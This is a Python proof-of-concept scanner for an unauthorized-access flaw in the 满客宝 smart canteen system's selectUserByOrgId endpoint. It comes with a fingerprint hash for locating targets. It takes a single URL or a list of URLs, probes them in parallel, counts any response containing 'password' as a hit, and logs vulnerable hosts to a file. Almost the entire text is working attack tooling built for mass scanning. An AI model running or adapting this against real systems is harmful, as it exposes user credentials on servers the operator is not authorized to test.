#满客宝智慧食堂系统selectUserByOrgId存在未授权访问漏洞
#icon_hash="-409875651"
import requests
import sys
import argparse
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def main():
    parse = argparse.ArgumentParser(description="sc环境")
    parse.add_argument('-u', '--url', dest='url', type=str, help='please enter the url:')
    parse.add_argument('-f', '--file', dest='file', type=str, help='please enter the filename:')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(10)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        pass

def poc(target):
    payload = '/yuding/selectUserByOrgId.action?record='
    # payload2='/magicflu/test3.jsp'

    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
    }
#     proxies = {
#     'http': 'http://127.0.0.1:8080',
#     'https': 'http://127.0.0.1:8080'
# }
    try:
        res1 = requests.get(url=target + payload, headers=headers, timeout=10, verify=False)
        # res2 =requests.get(url=target +payload2,header=headers,timeout=10, verify=False)
        if 'password' in res1.text:
            print(target + 'wenjianupload')
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print("there is no vulnurability")
    except requests.exceptions.RequestException as e:
        print(f"Error with {target}: {e}")

if __name__ == '__main__':
    main()
